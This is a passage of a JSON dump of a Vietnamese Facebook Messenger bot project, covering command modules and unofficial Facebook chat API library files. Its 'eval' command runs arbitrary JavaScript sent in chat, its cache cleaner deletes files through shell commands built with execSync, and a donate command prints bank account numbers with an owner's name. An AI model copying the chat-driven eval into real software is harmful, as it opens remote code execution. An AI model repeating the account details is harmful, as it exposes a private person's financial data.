msg.body.toString().replace(\"\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\\ufe0f\",'   ') : \"\",\n      html_body: false,\n      ui_push_phase: \"V3\",\n      status: \"0\",\n      offline_threading_id: messageAndOTID,\n      message_id: messageAndOTID,\n      threading_id: utils.generateThreadingID(ctx.clientID),\n      \"ephemeral_ttl_mode:\": \"0\",\n      manual_retry_cnt: \"0\",\n      has_attachment: !!(msg.attachment || msg.url || msg.sticker),\n      signatureID: utils.getSignatureID(),\n      replied_to_message_id: replyToMessage\n    };\n  \n    handleLocation(msg, form, callback, () =>\n      handleSticker(msg, form, callback, () =>\n        handleAttachment(msg, form, callback, () =>\n          handleUrl(msg, form, callback, () =>\n            handleEmoji(msg, form, callback, () =>\n              handleMention(msg, form, callback, () =>\n                send(form, threadID, messageAndOTID, callback, isGroup)\n              )\n            )\n          )\n        )\n      )\n    );\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":15659,"size_tokens":null},"modules/commands/llama3-70b.js":{"content":"const axios = require('axios');\nconst fs = require('fs');\nconst path = require('path');\n\nmodule.exports.config = {\n    name: \"llama3\",\n    version: \"1.0.0\",\n    hasPermssion: 0,\n    credits: \"TatsuYTB\",\n    description: \"Chat v·ªõi AI(llama3-70b)\",\n    commandCategory: \"AI\",\n    usages: \"llama3 n·ªôi dung\",\n    cooldowns: 10,\n};\n\nconst getApiUrl = () => {\n    try {\n        const filePath = path.join(__dirname, 'data', 'api.json');\n        const data = fs.readFileSync(filePath, 'utf-8');\n        const jsonData = JSON.parse(data);\n\n        if (!jsonData.llama370b || jsonData.llama370b.trim() === '') {\n            return null;\n        }\n\n        return jsonData.llama370b;\n    } catch {\n        return null;\n    }\n};\n\nconst getChatResponse = async (text, api, event) => {\n    const apiUrl = getApiUrl();\n    if (!apiUrl) {\n        return api.sendMessage(\"ƒêang c·∫≠p nh·∫≠t!!!\", event.threadID, event.messageID);\n    }\n    try {\n        const response = await axios.get(`${apiUrl}?q=${encodeURIComponent(text)}`);\n        if (response.data && response.data.result) {\n            return response.data.result;\n        } else {\n            return \"Kh√¥ng c√≥ k·∫øt qu·∫£ t·ª´ API.\";\n        }\n    } catch {\n        return \"ƒê√£ x·∫£y ra l·ªói khi k·∫øt n·ªëi t·ªõi API.\";\n    }\n};\n\nconst chatSessions = new Map();\n\nmodule.exports.run = async ({ api, event, args }) => {\n    try {\n        const text = args.join(' ');\n        if (!text) {\n            return api.sendMessage('Vui l√≤ng cung c·∫•p n·ªôi dung ƒë·ªÉ chat v·ªõi AI.', event.threadID, event.messageID);\n        }\n\n        const response = await getChatResponse(text, api, event);\n\n        const messageID = await new Promise((resolve, reject) => {\n            api.sendMessage(response, event.threadID, (error, info) => {\n                if (error) {\n                    reject(error);\n                } else {\n                    resolve(info.messageID);\n                }\n            }, event.messageID);\n        });\n\n        chatSessions[messageID] = event.threadID;\n    } catch {\n    }\n};\n\nmodule.exports.handleReply = async ({ api, event }) => {\n    try {\n        const sessionThreadID = chatSessions[event.messageReply?.messageID];\n\n        if (sessionThreadID && sessionThreadID === event.threadID) {\n            const text = event.body;\n\n            if (!text || text.trim() === '') {\n                return api.sendMessage('Vui l√≤ng cung c·∫•p n·ªôi dung ƒë·ªÉ ti·∫øp t·ª•c tr√≤ chuy·ªán.', event.threadID, event.messageID);\n            }\n\n            const response = await getChatResponse(text, api, event);\n\n            const messageID = await new Promise((resolve, reject) => {\n                api.sendMessage(response, event.threadID, (error, info) => {\n                    if (error) {\n                        reject(error);\n                    } else {\n                        resolve(info.messageID);\n                    }\n                }, event.messageID);\n            });\n\n            chatSessions[messageID] = event.threadID;\n            delete chatSessions[event.messageReply.messageID];\n        }\n    } catch {\n    }\n};\n\nmodule.exports.handleEvent = async function({ api, event }) {\n    if (\n        event.type === \"message_reply\" && \n        event.messageReply &&\n        chatSessions[event.messageReply.messageID]\n    ) {\n        await this.handleReply({ api, event });\n    }\n};\n\nmodule.exports.languages = {\n    \"vi\": {\n        \"description\": \"Chat v·ªõi AI th√¥ng qua API\"\n    }\n};\n","path":null,"size_bytes":3472,"size_tokens":null},"modules/commands/eval.js":{"content":"exports.config = {\n  name: 'eval',\n  version: '0.0.1',\n  hasPermssion: 3,\n  credits: 'DC-Nam',\n  description: 'Run code js',\n  commandCategory: 'H·ªá Th·ªëng',\n  usages: '[code]',\n  cooldowns: 1\n};\nexports.run = function(o) {\n  let send =x=>o.api.sendMessage(x, o.event.threadID, o.event.messageID);\n  try {\n    eval(o.args.join(' '));\n  } catch (e) {\n    send(e.toString());\n  };\n};","path":null,"size_bytes":383,"size_tokens":null},"lib/Fca-Horizon-Remastered/Func/ClearCache.js":{"content":"\"use strict\";\nconst { execSync } = require('child_process');\nvar utils = require(\"../utils\");\nvar log = require(\"../logger\");\nvar Object = ['png','json','wav','mp3','mp4','jpg','txt','gif','tff','m4a'];\nvar Recommend = ['png','wav','mp3','mp4','jpg','m4a'];\nmodule.exports = function (defaultFuncs, api, ctx) {\n    return function (Args,callback) {\n        let New1 = [];\n        if (!Args.New || utils.getType(Args.New) !== \"Array\") { \n            New1 = Recommend;\n            log.Normal(\"Kh√¥ng C√≥ Adding Th√™m, Ti·∫øn H√†nh S·ª≠ D·ª•ng Theo H·ªá Th·ªëng Ch·ªâ ƒê·ªãnh !\");\n        }\n        else {\n            for (let i = 0; i < Args.New.length; i++) {\n                if (Object.indexOf(Args.New[i]) === -1) {\n                    log.Normal('Kh√¥ng t√¨m th·∫•y file ' + Args.New[i] + ' trong danh s√°ch ƒë·ªãnh d·∫°ng');\n                    return;\n                }\n                New1.push(Args.New[i]);\n            }\n        }\n        var resolveFunc = function () { };\n        var rejectFunc = function () { };\n        var returnPromise = new Promise(function (resolve, reject) {\n            resolveFunc = resolve;\n            rejectFunc = reject;\n        });\n\n        if (!callback) {\n            callback = function (err, data) {\n                if (err) return rejectFunc(err);\n                resolveFunc(data);\n            };\n        }\n        switch (process.platform) {\n            case 'linux': {\n                for (let i = 0; i < New1.length; i++) {\n                    log.Normal('ƒêang Clear Lo·∫°i File ' + New1[i]);\n                    var STR = String(`find ./modules -type f -iname \\'*.${New1[i]}\\' -exec rm {} \\\\;`);\n                    execSync(STR);\n                }\n                log.Normal('Th√†nh C√¥ng Clear ' + New1.length + ' Lo·∫°i File !');\n                callback(null, 'Th√†nh C√¥ng Clear ' + New1.length + ' Lo·∫°i File !');\n            }\n            break;\n            case \"win32\": {\n                var cmd = \"del /q /s /f /a \";\n                for (let i = 0; i < New1.length; i++) {\n                    log.Normal('ƒêang Clear Lo·∫°i File ' + New1[i]);\n                    let STR = String(cmd + '.\\\\modules\\\\*.' + New1[i] + '\"');\n                    execSync(STR, { stdio: 'inherit' });\n                }\n                log.Normal('Th√†nh C√¥ng Clear ' + New1.length + ' Lo·∫°i File !');\n                callback(null, 'Th√†nh C√¥ng Clear ' + New1.length + ' Lo·∫°i File !');\n            }\n            break;\n            default: {\n                return log.Error('Not Supported');\n            }\n        }\n        return returnPromise;\n    };\n};\n","path":null,"size_bytes":2601,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/markAsRead.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return async function markAsRead(threadID, read, callback) {\n    if (utils.getType(read) === 'Function' || utils.getType(read) === 'AsyncFunction') {\n      callback = read;\n      read = true;\n    }\n    if (read == undefined) read = true;\n\n    if (!callback) callback = () => { };\n\n    var form = {};\n\n    if (typeof ctx.globalOptions.pageID !== 'undefined') {\n      form[\"source\"] = \"PagesManagerMessagesInterface\";\n      form[\"request_user_id\"] = ctx.globalOptions.pageID;\n      form[\"ids[\" + threadID + \"]\"] = read;\n      form[\"watermarkTimestamp\"] = new Date().getTime();\n      form[\"shouldSendReadReceipt\"] = true;\n      form[\"commerce_last_message_type\"] = \"\";\n      //form[\"titanOriginatedThreadId\"] = utils.generateThreadingID(ctx.clientID);\n\n      let resData;\n      try {\n        resData = await (\n          defaultFuncs\n            .post(\"https://www.facebook.com/ajax/mercury/change_read_status.php\", ctx.jar, form)\n            .then(utils.saveCookies(ctx.jar))\n            .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n        );\n      }\n      catch (e) {\n        callback(e);\n        return e;\n      }\n\n      if (resData.error) {\n        let err = resData.error;\n        log.error(\"markAsRead\", err);\n        if (utils.getType(err) == \"Object\" && err.error === \"Not logged in.\") ctx.loggedIn = false;\n        callback(err);\n        return err;\n      }\n\n      callback();\n      return null;\n    }\n    else {\n      try {\n        if (ctx.mqttClient) {\n          let err = await new Promise(r => ctx.mqttClient.publish(\"/mark_thread\", JSON.stringify({\n            threadID,\n            mark: \"read\",\n            state: read\n          }), { qos: 1, retain: false }, r));\n          if (err) throw err;\n        }\n        else throw { error: \"You can only use this function after you start listening.\" };\n      }\n      catch (e) {\n        callback(e);\n        return e;\n      }\n    }\n  };\n};\n","path":null,"size_bytes":2035,"size_tokens":null},"modules/commands/selflisten.js":{"content":"const fs = require(\"fs-extra\");\n\nmodule.exports.config = {\n    name: \"sl\",\n    version: \"1.0.0\",\n    hasPermssion: 3,\n    credits: \"TatsuYTB\",\n    description: \"B·∫≠t t·∫Øt ch·∫ø ƒë·ªô selfListen\",\n    commandCategory: \"H·ªá Th·ªëng\",\n    usages: \"sl on/off\",\n    cooldowns: 5,\n};\n\nmodule.exports.run = async function({ api, event, args, client }) {\n    const configPath = './config.json';\n\n    try {\n        const config = JSON.parse(fs.readFileSync(configPath, \"utf-8\"));\n        let tf, onoff;\n\n        if (args[0] === \"on\") {\n            tf = true;\n            onoff = \"b·∫≠t\";\n        } else if (args[0] === \"off\") {\n            tf = false;\n            onoff = \"t·∫Øt\";\n        } else {\n            return api.sendMessage(\"Vui l√≤ng s·ª≠ d·ª•ng: #sl on/off\", event.threadID, event.messageID);\n        }\n\n        config.FCAOption.selfListen = tf;\n        fs.writeFileSync(configPath, JSON.stringify(config, null, 2), \"utf-8\");\n\n        api.setOptions({ selfListen: tf });\n\n        return api.sendMessage(`ƒê√£ ${onoff} ch·∫ø ƒë·ªô selfListen`, event.threadID, event.messageID);\n    } catch (error) {\n        console.error(\"L·ªói khi c·∫≠p nh·∫≠t c·∫•u h√¨nh:\", error);\n        return api.sendMessage(\"ƒê√£ x·∫£y ra l·ªói khi c·∫≠p nh·∫≠t c·∫•u h√¨nh.\", event.threadID, event.messageID);\n    }\n};\n","path":null,"size_bytes":1300,"size_tokens":null},"modules/commands/kana.js":{"content":"module.exports.config = {\n  name: \"kana\",\n  version: \"2.0.0\",\n  hasPermssion: 0,\n  credits: \"Vtuan\",\n  description: \"Xem ·∫£nh\",\n  commandCategory: \"Random-img\",\n  usages: \"\",\n  cooldowns: 30\n};\n\nmodule.exports.run = async ({ api, event ,Users}) => {\n  const axios = require('axios');\n  const request = require('request');\n  const fs = require(\"fs\");\n  const girl = require('./../../img/kana.json');\n  var image1 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image2 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image3 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image4 = girl[Math.floor(Math.random() * girl.length)].trim();\n  function downloadAndSendImage(image,fileName,callback){\n    request(image).pipe(fs.createWriteStream(__dirname + `/`+fileName)).on(\"close\", callback);\n  }\n  let callback = function () {\n    return api.sendMessage({\n      body: 'B√© kana cuti:3',\n      attachment: [\n       fs.createReadStream(__dirname + `/1.png`), \n       fs.createReadStream(__dirname + `/2.png`), \n       fs.createReadStream(__dirname + `/3.png`), \n       fs.createReadStream(__dirname + `/4.png`)\n      ]\n    }, event.threadID, () => {\n      fs.unlinkSync(__dirname + `/1.png`);\n      fs.unlinkSync(__dirname + `/2.png`);\n      fs.unlinkSync(__dirname + `/3.png`);\n      fs.unlinkSync(__dirname + `/4.png`);\n    }, event.messageID);\n  };\n  downloadAndSendImage(image1,'1.png',()=>{\n    downloadAndSendImage(image2,'2.png',()=>{\n      downloadAndSendImage(image3,'3.png',()=>{\n        downloadAndSendImage(image4,'4.png',callback)\n      })\n    })\n  }) \n}","path":null,"size_bytes":1602,"size_tokens":null},"lib/fca-auto/Extra/Src/Release_Memory.js":{"content":"/* eslint-disable linebreak-style */\nconst fs = require('fs');\nconst path = require('path');\nconst v8 = require('v8');\nconst EventEmitter = require('events');\n\nclass MemoryManager extends EventEmitter {\n  constructor(options = {}) {\n    super();\n    this.thresholds = {\n      warning: options.warningThreshold || 0.7,\n      release: options.releaseThreshold || 0.8,\n      max: options.maxThreshold || 0.9,\n    };\n    this.interval = options.interval || 5000;\n    this.logLevel = options.logLevel || 'info';\n    this.logFile = options.logFile || path.join(__dirname, 'memory.log');\n    this.allowLog = options.allowLog || false;\n    this.weakRefs = new WeakMap();\n    this.smartReleaseEnabled = options.smartReleaseEnabled || false;\n    this.memoryUsageHistory = [];\n  }\n\n  start() {\n    this.intervalId = setInterval(() => {\n      const memoryUsage = this.getMemoryUsage();\n      this.logMemoryUsage(memoryUsage);\n\n      if (memoryUsage > this.thresholds.warning) {\n        this.emit('memoryWarning', memoryUsage);\n      }\n\n      if (memoryUsage > this.thresholds.release) {\n        this.releaseMemory(memoryUsage);\n      }\n\n      if (memoryUsage > this.thresholds.max) {\n        this.emit('memoryMax', memoryUsage);\n      }\n\n      if (this.smartReleaseEnabled) {\n        this.memoryUsageHistory.push(memoryUsage);\n        this.smartRelease();\n      }\n    }, this.interval);\n  }\n\n  stop() {\n    clearInterval(this.intervalId);\n  }\n\n  getMemoryUsage() {\n    const heapStats = v8.getHeapStatistics();\n    const totalHeapSize = heapStats.total_available_size / 1024 / 1024;\n    const usedHeapSize = heapStats.used_heap_size / 1024 / 1024;\n    return usedHeapSize / totalHeapSize;\n  }\n\n  releaseMemory(memoryUsage) {\n    if (global.gc) {\n      global.gc();\n    } else {\n      v8.setFlagsFromString('--expose_gc');\n      const vm = require('vm');\n      vm.runInNewContext('gc')();\n    }\n    this.emit('memoryReleased', memoryUsage);\n  }\n\n  logMemoryUsage(memoryUsage) {\n    const timestamp = new Date().toLocaleString(\"vi-vn\", {timeZone: \"Asia/Ho_Chi_Minh\"});\n    const logMessage = `${timestamp} - Memory usage: ${(memoryUsage * 100).toFixed(2)}%`;\n\n    switch (this.logLevel) {\n      case 'debug':\n       // console.debug(logMessage);\n        break;\n      case 'info':\n       //global.Fca.Require.logger.Info(logMessage);\n        break;\n      case 'warn':\n       // global.Fca.Require.logger.Normal(logMessage);\n        break;\n      case 'error':\n       // global.Fca.Require.logger.Error(logMessage);\n        break;\n      default:\n       // global.Fca.Require.logger.Normal(logMessage);\n    }\n    if (this.allowLog) {\n      fs.appendFile(this.logFile, `${logMessage}\\n`, (err) => {\n        if (err) throw err;\n      });\n    }\n  }\n\n  onMaxMemory(callback) {\n    this.on('memoryMax', callback);\n  }\n\n  addMemoryUsageListener(callback) {\n    this.on('memoryWarning', callback);\n    this.on('memoryReleased', callback);\n    this.on('memoryMax', callback);\n  }\n\n  removeMemoryUsageListener(callback) {\n    this.off('memoryWarning', callback);\n    this.off('memoryReleased', callback);\n    this.off('memoryMax', callback);\n  }\n\n  addThreshold(type, value) {\n    if (type === 'warning' || type === 'release' || type === 'max') {\n      this.thresholds[type] = value;\n    } else {\n      throw new Error('Invalid threshold type');\n    }\n  }\n\n  removeThreshold(type) {\n    if (type === 'warning' || type === 'release' || type === 'max') {\n      delete this.thresholds[type];\n    } else {\n      throw new Error('Invalid threshold type');\n    }\n  }\n\n  smartRelease() {\n    const memoryUsageHistory = this.memoryUsageHistory.slice(-100);\n    const averageUsage = memoryUsageHistory.reduce((sum, usage) => sum + usage, 0) / memoryUsageHistory.length;\n    const maxUsage = Math.max(...memoryUsageHistory);\n\n    if (averageUsage > this.thresholds.release && maxUsage > this.thresholds.max) {\n      this.releaseMemory(maxUsage);\n    }\n  }\n\n  autoStart(interval) { //1h\n    this.stopMemoryManager();\n    this.startMemoryManager();\n    this.autoStartInterval = setInterval(() => {\n      this.stopMemoryManager();\n      this.startMemoryManager();\n    }, interval);\n  }\n\n  stopMemoryManager() {\n    this.stop();\n    clearInterval(this.intervalId);\n    clearInterval(this.autoStartInterval);\n  }\n  \n  startMemoryManager() {\n    this.start();\n  }\n\n}\n\nmodule.exports = MemoryManager;","path":null,"size_bytes":4356,"size_tokens":null},"modules/commands/donate.js":{"content":"const fs = require('fs');\nconst path = require('path');\n\nmodule.exports.config = {\n  name: \"donate\",\n  version: \"1.0.0\",\n  hasPermssion: 0,\n  credits: \"TatsuYTB\",\n  description: \"Donate cho th·∫±ng admin ngh√®o kh·ªï\",\n  commandCategory: \"Ti·ªán √≠ch\",\n  usages: \"donate\",\n  cooldowns: 5,\n};\n\nmodule.exports.handleEvent = async ({ event, api, Threads }) => {\n  var { threadID, messageID, body } = event;\n\n  function out(data, attachment = null) {\n    api.sendMessage({ body: data, attachment: attachment }, threadID, messageID);\n  }\n\n  var dataThread = await Threads.getData(threadID);\n  var data = dataThread.data;\n  const threadSetting = global.data.threadData.get(parseInt(threadID)) || {};\n\n  var arr = [\"donate\"];\n  arr.forEach(i => {\n    let str = i[0].toUpperCase() + i.slice(1);\n    if (body === i.toUpperCase() || body === i || str === body) {\n      const imagePath = './modules/commands/donate';\n\n      if (!fs.existsSync(imagePath)) {\n        return out(\"Th∆∞ m·ª•c ch·ª©a ·∫£nh kh√¥ng t·ªìn t·∫°i.\");\n      }\n\n      let attachments = [];\n      try {\n        fs.readdirSync(imagePath).forEach(file => {\n          if (file.endsWith('.jpg') || file.endsWith('.png')) { // Ch·ªâ l·∫•y c√°c t·ªáp c√≥ ƒë·ªãnh d·∫°ng .jpg ho·∫∑c .png\n            attachments.push(fs.createReadStream(path.join(imagePath, file)));\n          }\n        });\n      } catch (error) {\n        return out(\"ƒê√£ x·∫£y ra l·ªói khi ƒë·ªçc th∆∞ m·ª•c ch·ª©a ·∫£nh.\");\n      }\n\n      if (attachments.length === 0) {\n        return out(\"Kh√¥ng t√¨m th·∫•y ·∫£nh trong th∆∞ m·ª•c.\");\n      }\n\n      let message = `---------------------\\nBIDV: 8864922580\\nNguy·ªÖn Tu·∫•n Ninh\\n---------------------\\nùêïùê¢ùêûùê≠ùêÇùê®ùê¶ùêÅùêöùêßùê§: 1041959515\\nNguy·ªÖn Tu·∫•n Ninh\\n---------------------`;\n\n      if (data.PREFIX == null) {\n        message = `ùêÉùê®ùêßùêöùê≠ùêû ùêúùê°ùê® ùê≠ùê°ùêöÃÜÃÄùêßùê† ùêöùêùùê¶ùê¢ùêß ùêßùê†ùê°ùêûÃÄùê® ùê§ùê°ùê®ÃÇÃâ\\n---------------------\\n${message}`;\n      } else {\n        message += data.PREFIX;\n      }\n\n      return out(message, attachments);\n    }\n  });\n};\n\nmodule.exports.run = async ({ event, api }) => {};","path":null,"size_bytes":2155,"size_tokens":null},"modules/commands/mirai.js":{"content":"module.exports.config = {\n  name: \"mirai\",\n  version: \"2.0.0\",\n  hasPermssion: 0,\n  credits: \"Vtuan\",\n  description: \"Xem ·∫£nh\",\n  commandCategory: \"Random-img\",\n  usages: \"\",\n  cooldowns: 30\n};\n\nmodule.exports.run = async ({ api, event ,Users}) => {\n  const axios = require('axios');\n  const request = require('request');\n  const fs = require(\"fs\");\n  const girl = require('./../../img/mirai.json');\n  var image1 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image2 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image3 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image4 = girl[Math.floor(Math.random() * girl.length)].trim();\n  function downloadAndSendImage(image,fileName,callback){\n    request(image).pipe(fs.createWriteStream(__dirname + `/`+fileName)).on(\"close\", callback);\n  }\n  let callback = function () {\n    return api.sendMessage({\n      body: 'Bbi mirai n√®:3',\n      attachment: [\n       fs.createReadStream(__dirname + `/1.png`), \n       fs.createReadStream(__dirname + `/2.png`), \n       fs.createReadStream(__dirname + `/3.png`), \n       fs.createReadStream(__dirname + `/4.png`)\n      ]\n    }, event.threadID, () => {\n      fs.unlinkSync(__dirname + `/1.png`);\n      fs.unlinkSync(__dirname + `/2.png`);\n      fs.unlinkSync(__dirname + `/3.png`);\n      fs.unlinkSync(__dirname + `/4.png`);\n    }, event.messageID);\n  };\n  downloadAndSendImage(image1,'1.png',()=>{\n    downloadAndSendImage(image2,'2.png',()=>{\n      downloadAndSendImage(image3,'3.png',()=>{\n        downloadAndSendImage(image4,'4.png',callback)\n      })\n    })\n  }) \n}","path":null,"size_bytes":1604,"size_tokens":null},"lib/fca-auto/src/deleteThread.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function deleteThread(threadOrThreads, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n    if (!callback) {\n      callback = function (err) {\n        if (err) return rejectFunc(err);\n        resolveFunc();\n      };\n    }\n\n    var form = {\n      client: \"mercury\"\n    };\n\n    if (utils.getType(threadOrThreads) !== \"Array\") threadOrThreads = [threadOrThreads];\n    for (var i = 0; i < threadOrThreads.length; i++) form[\"ids[\" + i + \"]\"] = threadOrThreads[i];\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/ajax/mercury/delete_thread.php\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error) throw resData;\n\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"deleteThread\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1186,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/createPoll.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function createPoll(title, threadID, options, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      if (utils.getType(options) == \"Function\") {\n        callback = options;\n        options = null;\n      }\n      else {\n        callback = function (err) {\n          if (err) return rejectFunc(err);\n          resolveFunc();\n        };\n      }\n    }\n    if (!options) options = {}; // Initial poll options are optional\n\n    var form = {\n      target_id: threadID,\n      question_text: title\n    };\n\n    // Set fields for options (and whether they are selected initially by the posting user)\n    var ind = 0;\n    for (var opt in options) {\n      // eslint-disable-next-line no-prototype-builtins\n      if (options.hasOwnProperty(opt)) {\n        form[\"option_text_array[\" + ind + \"]\"] = opt;\n        form[\"option_is_selected_array[\" + ind + \"]\"] = options[opt] ? \"1\" : \"0\";\n        ind++;\n      }\n    }\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/messaging/group_polling/create_poll/?dpr=1\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.payload.status != \"success\") throw resData;\n\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"createPoll\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1679,"size_tokens":null},"modules/commands/banuser.js":{"content":"module.exports.config = {\n  name: \"banuser\",\n  version: \"1.0.5\",\n  hasPermssion: 2,\n  credits: \"Mirai Team\",\n  description: \"C·∫•m ho·∫∑c g·ª° c·∫•m ng∆∞·ªùi d√πng\",\n  commandCategory: \"H·ªá Th·ªëng\",\n  usages: \"[unban/ban/search] [ID or text]\",\n  cooldowns: 5\n};\n\nmodule.exports.languages = {\n  \"vi\": {\n    \"reason\": \"L√Ω do\",\n    \"at\": \"v√†o l√∫c\",\n    \"allCommand\": \"to√†n b·ªô l·ªánh\",\n    \"commandList\": \"nh·ªØng l·ªánh\",\n    \"banSuccess\": \"[ Ban User ] ƒê√£ x·ª≠ l√Ω th√†nh c√¥ng y√™u c·∫ßu c·∫•m ng∆∞·ªùi d√πng: %1\",\n    \"unbanSuccess\": \"[ Unban User ] ƒê√£ x·ª≠ l√Ω th√†nh c√¥ng y√™u c·∫ßu g·ª° c·∫•m ng∆∞·ªùi d√πng %1\",\n    \"banCommandSuccess\": \"[ banCommand User ] ƒê√£ x·ª≠ l√Ω th√†nh c√¥ng y√™u c·∫ßu c·∫•m l·ªánh ƒë·ªëi v·ªõi ng∆∞·ªùi d√πng: %1\",\n    \"unbanCommandSuccess\": \"[ UnbanCommand User ] ƒê√£ x·ª≠ l√Ω th√†nh c√¥ng y√™u c·∫ßu g·ª° c·∫•m %1 ƒë·ªëi v·ªõi ng∆∞·ªùi d√πng: %2\",\n    \"errorReponse\": \"%1 Kh√¥ng th·ªÉ ho√†n t·∫•t c√¥ng vi·ªác b·∫°n y√™u c·∫ßu\",\n    \"IDNotFound\": \"%1 ID ng∆∞·ªùi d√πng b·∫°n nh·∫≠p kh√¥ng t·ªìn t·∫°i trong c∆° s·ªü d·ªØ li·ªáu\",\n    \"existBan\": \"[ Ban User ] Ng∆∞·ªùi d√πng %1 ƒë√£ b·ªã ban t·ª´ tr∆∞·ªõc %2 %3\",\n    \"notExistBan\": \"[ Unban User ] Ng∆∞·ªùi d√πng b·∫°n nh·∫≠p ch∆∞a t·ª´ng b·ªã c·∫•m s·ª≠ d·ª•ng bot\",\n    \"missingCommandInput\": \"%1 Ph·∫ßn command c·∫ßn c·∫•m kh√¥ng ƒë∆∞·ª£c ƒë·ªÉ tr·ªëng!\",\n    \"notExistBanCommand\": \"[ UnbanCommand User ] Hi·ªán t·∫°i ID ng∆∞·ªùi d√πng b·∫°n nh·∫≠p ch∆∞a t·ª´ng b·ªã c·∫•m s·ª≠ d·ª•ng l·ªánh\",\n\n    \"returnBan\": \"[ Ban User ] Hi·ªán t·∫°i b·∫°n ƒëang y√™u c·∫ßu c·∫•m ng∆∞·ªùi d√πng:\\n- ID v√† t√™n ng∆∞·ªùi d√πng c·∫ßn c·∫•m: %1%2\\n\\n‚ùÆ Reaction tin nh·∫Øn n√†y ƒë·ªÉ x√°c th·ª±c ‚ùØ\",\n    \"returnUnban\": \"[ Unban User ] Hi·ªán t·∫°i b·∫°n ƒëang y√™u c·∫ßu g·ª° c·∫•m ng∆∞·ªùi d√πng:\\n- ID v√† t√™n ng∆∞·ªùi d√πng c·∫ßn g·ª° c·∫•m: %1\\n\\n‚ùÆ Reaction tin nh·∫Øn n√†y ƒë·ªÉ x√°c th·ª±c ‚ùØ\",\n    \"returnBanCommand\": \"[ banCommand User ] Hi·ªán t·∫°i b·∫°n ƒëang y√™u c·∫ßu c·∫•m s·ª≠ d·ª•ng l·ªánh ƒë·ªëi v·ªõi ng∆∞·ªùi d√πng:\\n - ID v√† t√™n ng∆∞·ªùi d√πng c·∫ßn c·∫•m: %1\\n- C√°c l·ªánh c·∫ßn c·∫•m: %2\\n\\n‚ùÆ Reaction tin nh·∫Øn n√†y ƒë·ªÉ x√°c th·ª±c ‚ùØ\",\n    \"returnUnbanCommand\": \"[ UnbanCommand User ] Hi·ªán t·∫°i b·∫°n ƒëang y√™u c·∫ßu g·ª° c·∫•m s·ª≠ d·ª•ng l·ªánh ƒë·ªëi v·ªõi v·ªõi ng∆∞·ªùi d√πng:\\n - ID v√† t√™n ng∆∞·ªùi d√πng c·∫ßn g·ª° c·∫•m l·ªánh: 